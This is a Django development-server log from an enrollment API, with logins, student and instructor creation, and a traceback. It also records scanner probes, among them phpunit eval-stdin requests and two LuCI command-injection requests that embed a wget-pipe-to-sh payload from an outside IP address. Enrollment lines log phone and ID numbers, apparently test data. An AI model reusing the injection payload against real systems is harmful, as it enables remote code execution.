INFO 2024-08-18 11:13:19,779 autoreload Watching for file changes with StatReloader
INFO 2024-09-16 20:19:32,246 basehttp code 505, message Invalid HTTP version (2.0)
ERROR 2024-09-16 20:19:32,247 basehttp "PRI * HTTP/2.0" 505 -
INFO 2024-09-16 22:09:12,025 basehttp code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
ERROR 2024-09-16 22:09:12,063 basehttp You're accessing the development server over HTTPS, but it only supports HTTP.
WARNING 2024-09-16 23:50:38,765 log Not Found: /setup/index.jsp
WARNING 2024-09-16 23:50:38,769 basehttp "GET /setup/index.jsp HTTP/1.1" 404 2542
WARNING 2024-09-17 00:07:24,992 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-17 00:07:24,993 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
WARNING 2024-09-17 01:24:18,849 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-17 01:24:18,856 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
INFO 2024-09-17 01:53:25,490 basehttp code 400, message Bad request version ('À\x14À')
ERROR 2024-09-17 01:53:25,491 basehttp You're accessing the development server over HTTPS, but it only supports HTTP.
WARNING 2024-09-17 02:50:20,713 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-17 02:50:20,716 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
WARNING 2024-09-17 04:42:14,646 log Not Found: /
WARNING 2024-09-17 04:42:14,651 basehttp "GET / HTTP/1.1" 404 2479
WARNING 2024-09-17 04:58:38,284 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-17 04:58:38,285 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
INFO 2024-09-17 05:56:29,774 basehttp code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
ERROR 2024-09-17 05:56:29,777 basehttp You're accessing the development server over HTTPS, but it only supports HTTP.
WARNING 2024-09-17 07:26:52,921 log Not Found: /setup/index.jsp
WARNING 2024-09-17 07:26:52,932 basehttp "GET /setup/index.jsp HTTP/1.1" 404 2542
WARNING 2024-09-17 08:58:08,648 log Not Found: /
WARNING 2024-09-17 08:58:08,672 basehttp "GET / HTTP/1.1" 404 2479
WARNING 2024-09-17 08:58:19,889 log Not Found: /favicon.ico
WARNING 2024-09-17 08:58:19,890 basehttp "GET /favicon.ico HTTP/1.1" 404 2530
INFO 2024-09-17 13:41:09,137 basehttp "POST /api/login HTTP/1.0" 200 111
INFO 2024-09-17 13:41:25,604 services 0208765421
INFO 2024-09-17 13:41:25,639 basehttp "POST /api/login HTTP/1.0" 200 919
INFO 2024-09-17 13:41:25,845 basehttp "GET /api/search?type=student&name= HTTP/1.0" 301 0
INFO 2024-09-17 13:41:26,040 services Student query: (AND: ('instructor', UUID('e2d9e508-ac3a-460a-bf1a-379f7cdd99c6')))
INFO 2024-09-17 13:41:26,060 basehttp "GET /api/search/?type=student&name= HTTP/1.0" 200 978
INFO 2024-09-17 13:41:26,152 basehttp "GET /api/media/images/kpmg-nouvelle.PNG HTTP/1.0" 200 270546
INFO 2024-09-17 13:42:11,561 views Enrollment
INFO 2024-09-17 13:42:11,567 services {'email': 'example@mail.com', 'first_name': 'koudou', 'last_name': 'droubbli', 'telephone': '0777454421', 'num_piece': '3772829302', 'enrollment_date': datetime.date(2024, 9, 17), 'date_of_birth': datetime.date(2024, 9, 17), 'is_instructor': False, 'is_student': True}
INFO 2024-09-17 13:42:11,567 services User creation...
INFO 2024-09-17 13:42:12,081 services User created 73 !
INFO 2024-09-17 13:42:12,081 services Define user password...
INFO 2024-09-17 13:42:12,520 services User password defined
INFO 2024-09-17 13:42:12,521 services Student creation...
INFO 2024-09-17 13:42:12,524 services Eleve creation...
INFO 2024-09-17 13:42:12,535 services Student created f0820634-1a80-41b7-add4-fe9a858e3ef9
INFO 2024-09-17 13:42:12,543 basehttp "POST /api/enrollment HTTP/1.0" 200 125
INFO 2024-09-17 13:42:18,281 basehttp "GET /api/search?type=student&name= HTTP/1.0" 301 0
INFO 2024-09-17 13:42:18,467 services Student query: (AND: ('instructor', UUID('e2d9e508-ac3a-460a-bf1a-379f7cdd99c6')))
INFO 2024-09-17 13:42:18,473 basehttp "GET /api/search/?type=student&name= HTTP/1.0" 200 1308
INFO 2024-09-17 13:42:57,802 basehttp "GET /api/media/images/kpmg-nouvelle.PNG HTTP/1.0" 200 270546
ERROR 2024-09-17 13:48:13,742 views {'username': [ErrorDetail(string='This field may not be blank.', code='blank')], 'password': [ErrorDetail(string='This field may not be blank.', code='blank')]}
ERROR 2024-09-17 13:48:13,745 log Internal Server Error: /api/login
ERROR 2024-09-17 13:48:13,746 basehttp "POST /api/login HTTP/1.0" 500 172
WARNING 2024-09-17 15:03:02,472 log Not Found: /setup/index.jsp
WARNING 2024-09-17 15:03:02,484 basehttp "GET /setup/index.jsp HTTP/1.1" 404 2542
WARNING 2024-09-17 17:02:59,077 log Not Found: /
WARNING 2024-09-17 17:02:59,094 basehttp "GET / HTTP/1.1" 404 2479
WARNING 2024-09-17 17:06:33,803 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-17 17:06:33,804 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
INFO 2024-09-17 17:25:48,344 basehttp - Broken pipe from ('104.152.52.231', 53916)
INFO 2024-09-17 19:57:35,212 basehttp "POST /api/login HTTP/1.0" 200 111
INFO 2024-09-17 19:58:14,580 services 0208765421
INFO 2024-09-17 19:58:14,586 basehttp "POST /api/login HTTP/1.0" 200 919
INFO 2024-09-17 19:58:14,760 basehttp "GET /api/search?type=student&name= HTTP/1.0" 301 0
INFO 2024-09-17 19:58:14,892 basehttp "OPTIONS /api/search/?type=student&name= HTTP/1.0" 200 0
WARNING 2024-09-17 19:58:15,073 log Unauthorized: /api/search/
WARNING 2024-09-17 19:58:15,074 basehttp "GET /api/search/?type=student&name= HTTP/1.0" 401 58
INFO 2024-09-17 19:58:15,229 basehttp "GET /api/media/images/kpmg-nouvelle.PNG HTTP/1.0" 200 270546
INFO 2024-09-17 19:59:05,973 basehttp "GET /api/media/images/kpmg-nouvelle.PNG HTTP/1.0" 200 270546
INFO 2024-09-17 19:59:31,793 services Insctructor update...
INFO 2024-09-17 19:59:31,798 services 0208765421
INFO 2024-09-17 19:59:31,799 services <QueryDict: {'id': ['e2d9e508-ac3a-460a-bf1a-379f7cdd99c6'], 'name': ['KPMG-NOUVELLEssmm'], 'email': ['QPM@GMAIL.COM'], 'first_name': ['MOUR'], 'last_name': ['MOUR'], 'telephone': ['0208765421'], 'password': [''], 'password2': [''], 'logo': [<InMemoryUploadedFile: IMAGE.PNG (application/octet-stream)>], 'user': [<User: 0208765421>]}>
INFO 2024-09-17 19:59:31,821 services Instructor created: False
INFO 2024-09-17 19:59:31,826 basehttp "POST /api/update_instructor HTTP/1.0" 200 236
INFO 2024-09-17 19:59:32,155 basehttp "GET /api/search?type=student&name= HTTP/1.0" 301 0
WARNING 2024-09-17 19:59:32,409 log Unauthorized: /api/search/
WARNING 2024-09-17 19:59:32,410 basehttp "GET /api/search/?type=student&name= HTTP/1.0" 401 58
INFO 2024-09-17 19:59:32,439 basehttp "GET /api/media/images/kpmg-nouvellessmm.PNG HTTP/1.0" 200 270546
INFO 2024-09-17 19:59:32,800 basehttp "GET /api/media/images/kpmg-nouvellessmm.PNG HTTP/1.0" 200 270546
INFO 2024-09-17 20:04:17,694 services 0208765421
INFO 2024-09-17 20:04:17,698 basehttp "POST /api/login HTTP/1.0" 200 931
INFO 2024-09-17 20:04:17,920 basehttp "GET /api/search?type=student&name= HTTP/1.0" 301 0
INFO 2024-09-17 20:04:18,107 services Student query: (AND: ('instructor', UUID('e2d9e508-ac3a-460a-bf1a-379f7cdd99c6')))
INFO 2024-09-17 20:04:18,113 basehttp "GET /api/search/?type=student&name= HTTP/1.0" 200 1308
INFO 2024-09-17 20:04:18,365 basehttp "GET /api/media/images/kpmg-nouvellessmm.PNG HTTP/1.0" 200 270546
WARNING 2024-09-17 22:37:09,836 log Not Found: /cgi-bin/luci/;stok=/locale
WARNING 2024-09-17 22:37:09,840 basehttp "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F23.228.72.18%2Flink%7Csh%3B%60) HTTP/1.1" 404 2688
WARNING 2024-09-17 22:37:11,230 log Not Found: /setup/index.jsp
WARNING 2024-09-17 22:37:11,231 basehttp "GET /setup/index.jsp HTTP/1.1" 404 2542
INFO 2024-09-17 22:37:39,707 basehttp - Broken pipe from ('199.195.249.112', 40998)
INFO 2024-09-18 03:41:54,577 basehttp code 400, message Bad request version ('À\x14À')
ERROR 2024-09-18 03:41:54,583 basehttp You're accessing the development server over HTTPS, but it only supports HTTP.
WARNING 2024-09-18 04:04:31,382 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-18 04:04:31,385 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
WARNING 2024-09-18 04:31:25,823 log Not Found: /cgi-bin/luci/;stok=/locale
WARNING 2024-09-18 04:31:25,827 basehttp "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F23.228.72.18%2Flink%7Csh%3B%60) HTTP/1.1" 404 2688
INFO 2024-09-18 04:31:55,727 basehttp - Broken pipe from ('199.195.249.112', 36372)
INFO 2024-09-18 04:38:00,623 basehttp code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
ERROR 2024-09-18 04:38:00,624 basehttp You're accessing the development server over HTTPS, but it only supports HTTP.
WARNING 2024-09-18 05:03:26,818 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-18 05:03:26,821 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
WARNING 2024-09-18 05:16:38,471 log Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
WARNING 2024-09-18 05:16:38,472 basehttp "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 6298
INFO 2024-09-18 05:55:02,065 basehttp code 400, message Bad request version ('À\x14À')
ERROR 2024-09-18 05:55:02,069 basehttp You're accessing the development server over HTTPS, but it only supports HTTP.
WARNING 2024-09-18 05:55:02,589 log Not Found: /api/v1/targets
WARNING 2024-09-18 05:55:02,591 basehttp "GET /api/v1/targets HTTP/1.1" 404 6183
WARNING 2024-09-18 05:55:02,725 log Not Found: /api/v1/targets
WARNING 2024-09-18 05:55:02,726 basehttp "GET /api/v1/targets HTTP/1.1" 404 6183
WARNING 2024-09-18 05:55:03,144 log Not Found: /api/v1/label/version/values
WARNING 2024-09-18 05:55:03,145 basehttp "GET /api/v1/label/version/values HTTP/1.1" 404 6222
WARNING 2024-09-18 05:55:03,231 log Not Found: /api/v1/label/version/values
WARNING 2024-09-18 05:55:03,232 basehttp "GET /api/v1/label/version/values HTTP/1.1" 404 6222
WARNING 2024-09-18 05:55:03,747 log Not Found: /api/v1/label/goversion/values
WARNING 2024-09-18 05:55:03,748 basehttp "GET /api/v1/label/goversion/values HTTP/1.1" 404 6228
WARNING 2024-09-18 05:55:03,880 log Not Found: /api/v1/label/goversion/values
WARNING 2024-09-18 05:55:03,881 basehttp "GET /api/v1/label/goversion/values HTTP/1.1" 404 6228
WARNING 2024-09-18 05:55:03,899 log Not Found: /api/v1/query
WARNING 2024-09-18 05:55:03,899 basehttp "GET /api/v1/query?query=prometheus_build_info HTTP/1.1" 404 6205
WARNING 2024-09-18 05:55:03,955 log Not Found: /api/v1/query
WARNING 2024-09-18 05:55:03,956 basehttp "GET /api/v1/query?query=prometheus_build_info HTTP/1.1" 404 6205
WARNING 2024-09-18 05:55:04,072 log Not Found: /api/v1/labels
WARNING 2024-09-18 05:55:04,072 basehttp "GET /api/v1/labels HTTP/1.1" 404 6180
WARNING 2024-09-18 05:55:04,125 log Not Found: /api/v1/labels
WARNING 2024-09-18 05:55:04,159 basehttp "GET /api/v1/labels HTTP/1.1" 404 6180
WARNING 2024-09-18 05:55:04,198 log Not Found: /api/v1/label/__name__/values
WARNING 2024-09-18 05:55:04,199 basehttp "GET /api/v1/label/__name__/values HTTP/1.1" 404 6225
WARNING 2024-09-18 05:55:04,218 log Not Found: /api/v1/label/__name__/values
WARNING 2024-09-18 05:55:04,218 basehttp "GET /api/v1/label/__name__/values HTTP/1.1" 404 6225
WARNING 2024-09-18 05:55:04,467 log Not Found: /api/v1/status/config
WARNING 2024-09-18 05:55:04,470 basehttp "GET /api/v1/status/config HTTP/1.1" 404 6201
WARNING 2024-09-18 05:55:04,528 log Not Found: /
WARNING 2024-09-18 05:55:04,529 basehttp "GET / HTTP/1.1" 404 2479
INFO 2024-09-18 05:55:11,151 basehttp - Broken pipe from ('167.94.145.96', 57806)
INFO 2024-09-18 05:55:11,188 basehttp code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x031ëv\x84#«\x8b2J>¸\x153\x8d>(j¯Tö¨\x11jj¶\x8c\x13\x18j\x82KD')
ERROR 2024-09-18 05:55:11,188 basehttp You're accessing the development server over HTTPS, but it only supports HTTP.
WARNING 2024-09-18 05:55:14,411 log Not Found: /
WARNING 2024-09-18 05:55:14,412 basehttp "GET / HTTP/1.1" 404 2479
INFO 2024-09-18 05:55:14,422 basehttp - Broken pipe from ('167.94.145.96', 57856)
WARNING 2024-09-18 05:55:17,485 log Not Found: /
WARNING 2024-09-18 05:55:17,486 basehttp "GET / HTTP/1.1" 404 2479
INFO 2024-09-18 05:55:17,504 basehttp code 505, message Invalid HTTP version (2.0)
ERROR 2024-09-18 05:55:17,504 basehttp "PRI * HTTP/2.0" 505 -
WARNING 2024-09-18 06:13:18,845 log Not Found: /setup/index.jsp
WARNING 2024-09-18 06:13:18,846 basehttp "GET /setup/index.jsp HTTP/1.1" 404 2542
WARNING 2024-09-18 06:36:34,550 log Not Found: /
WARNING 2024-09-18 06:36:34,553 basehttp "GET / HTTP/1.1" 404 2479
WARNING 2024-09-18 08:03:19,538 log Unauthorized: /api/instructor
INFO 2024-09-18 08:03:34,198 services User creation...
INFO 2024-09-18 08:03:34,198 services {'username': '0208765421', 'first_name': 'MOUR', 'last_name': 'MOUR', 'email': 'QPM@GMAIL.COM', 'is_instructor': True, 'is_student': False}
ERROR 2024-09-18 08:03:34,255 views {'username': [ErrorDetail(string='A user with that username already exists.', code='unique')]}
WARNING 2024-09-18 08:03:34,257 log Bad Request: /api/instructor
WARNING 2024-09-18 08:03:34,257 basehttp "POST /api/instructor HTTP/1.1" 400 58
INFO 2024-09-18 08:26:44,955 services User creation...
INFO 2024-09-18 08:26:44,958 services {'username': '9867867686', 'first_name': 'DED', 'last_name': 'DED', 'email': 'dd@Ya.com', 'is_instructor': True, 'is_student': False}
INFO 2024-09-18 08:26:45,460 services User created !
INFO 2024-09-18 08:26:45,460 services Define password...
INFO 2024-09-18 08:26:45,916 services Password defined !
INFO 2024-09-18 08:26:45,917 services Instructor creation...
INFO 2024-09-18 08:26:45,918 services Insctructor creation...
INFO 2024-09-18 08:26:45,948 services Instructor created  DED DED !
INFO 2024-09-18 08:26:45,955 basehttp "POST /api/instructor HTTP/1.1" 200 208
INFO 2024-09-18 08:47:15,227 services User creation...
INFO 2024-09-18 08:47:15,229 services {'username': '8978978977', 'first_name': 'ded', 'last_name': 'ededed', 'email': 'dedde@JHJ.COM', 'is_instructor': True, 'is_student': False}
INFO 2024-09-18 08:47:15,707 services User created !
INFO 2024-09-18 08:47:15,707 services Define password...
INFO 2024-09-18 08:47:16,186 services Password defined !
INFO 2024-09-18 08:47:16,187 services Instructor creation...
INFO 2024-09-18 08:47:16,187 services Insctructor creation...
INFO 2024-09-18 08:47:16,195 services Instructor created  ded ededed !
INFO 2024-09-18 08:47:16,198 basehttp "POST /api/instructor HTTP/1.1" 200 211
INFO 2024-09-18 08:50:31,515 services User creation...
INFO 2024-09-18 08:50:31,516 services {'username': '8978976897', 'first_name': 'TEST', 'last_name': 'UN TEST', 'email': 'aaa@hh.com', 'is_instructor': True, 'is_student': False}
INFO 2024-09-18 08:50:31,993 services User created !
INFO 2024-09-18 08:50:31,994 services Define password...
INFO 2024-09-18 08:50:32,447 services Password defined !
INFO 2024-09-18 08:50:32,447 services Instructor creation...
INFO 2024-09-18 08:50:32,448 services Insctructor creation...
INFO 2024-09-18 08:50:32,453 services Instructor created  TEST UN TEST !
ERROR 2024-09-18 08:50:32,456 views The 'logo' attribute has no file associated with it.
ERROR 2024-09-18 08:50:32,541 log Internal Server Error: /api/instructor
Traceback (most recent call last):
  File "/usr/local/lib/python3.12/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
               ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/django/core/handlers/base.py", line 197, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/django/views/decorators/csrf.py", line 65, in _view_wrapper
    return view_func(request, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/django/views/decorators/csrf.py", line 65, in _view_wrapper
    return view_func(request, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/django/views/generic/base.py", line 104, in view
    return self.dispatch(request, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/rest_framework/views.py", line 509, in dispatch
    response = self.handle_exception(exc)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/rest_framework/views.py", line 469, in handle_exception
    self.raise_uncaught_exception(exc)
  File "/usr/local/lib/python3.12/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
    raise exc
  File "/usr/local/lib/python3.12/site-packages/rest_framework/views.py", line 506, in dispatch
    response = handler(request, *args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/rest_framework/decorators.py", line 50, in handler
    return func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/contextlib.py", line 81, in inner
    return func(*args, **kwds)
           ^^^^^^^^^^^^^^^^^^^
  File "/opt/api/api/views.py", line 33, in instructor
    raise e
  File "/opt/api/api/views.py", line 29, in instructor
    result = inscription_service.instructor_subscription(request.data)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/contextlib.py", line 81, in inner
    return func(*args, **kwds)
           ^^^^^^^^^^^^^^^^^^^
  File "/opt/api/api/services.py", line 270, in instructor_subscription
    raise e
  File "/opt/api/api/services.py", line 266, in instructor_subscription
    return InstructorSerializer(instance=ins_account).data
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/rest_framework/serializers.py", line 571, in data
    ret = super().data
          ^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/rest_framework/serializers.py", line 249, in data
    self._data = self.to_representation(self.instance)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/rest_framework/serializers.py", line 538, in to_representation
    ret[field.field_name] = field.to_representation(attribute)
                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/rest_framework/fields.py", line 1870, in to_representation
    return method(value)
           ^^^^^^^^^^^^^
  File "/opt/api/api/serializers.py", line 30, in get_logo_url
    return obj.logo.url
           ^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/django/db/models/fields/files.py", line 69, in url
    self._require_file()
  File "/usr/local/lib/python3.12/site-packages/django/db/models/fields/files.py", line 44, in _require_file
    raise ValueError(
ValueError: The 'logo' attribute has no file associated with it.
ERROR 2024-09-18 08:50:32,547 basehttp "POST /api/instructor HTTP/1.0" 500 155026
INFO 2024-09-18 08:51:19,413 services User creation...
INFO 2024-09-18 08:51:19,413 services {'username': '8968686896', 'first_name': 'TEST', 'last_name': 'TEST', 'email': 'TEST@TEST.COM', 'is_instructor': True, 'is_student': False}
INFO 2024-09-18 08:51:19,856 services User created !
INFO 2024-09-18 08:51:19,857 services Define password...
INFO 2024-09-18 08:51:20,367 services Password defined !
INFO 2024-09-18 08:51:20,367 services Instructor creation...
INFO 2024-09-18 08:51:20,367 services Insctructor creation...
INFO 2024-09-18 08:51:20,378 services Instructor created  TEST TEST !
INFO 2024-09-18 08:51:20,382 basehttp "POST /api/instructor HTTP/1.0" 200 212
INFO 2024-09-18 08:52:40,260 services User creation...
INFO 2024-09-18 08:52:40,260 services {'username': '0208765421', 'first_name': 'MOUR', 'last_name': 'MOUR', 'email': 'QPM@GMAIL.COM', 'is_instructor': True, 'is_student': False}
ERROR 2024-09-18 08:52:40,265 views {'username': [ErrorDetail(string='A user with that username already exists.', code='unique')]}
